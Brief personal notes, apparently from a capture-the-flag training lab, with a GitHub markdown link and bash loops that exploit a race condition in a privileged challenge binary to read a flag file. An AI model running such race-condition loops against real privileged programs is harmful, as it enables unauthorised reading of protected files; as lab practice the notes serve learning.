## Github markdown and formatting syntax.
`https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax`

## Bash scripts for Race Conditions
Important to setup the target file first in userspace so that it can be edited by the user even though the target script executes as admin

 `while /bin/true; do cp -v /home/hacker/catflag /home/hacker/in; done`
 
 `while /bin/true; do /challenge/classwork /home/hacker/in >> /home/hacker/output.txt; done`

 Grep to search for flag in output
 
 `cat /home/hacker/output.txt | grep "pwn"`
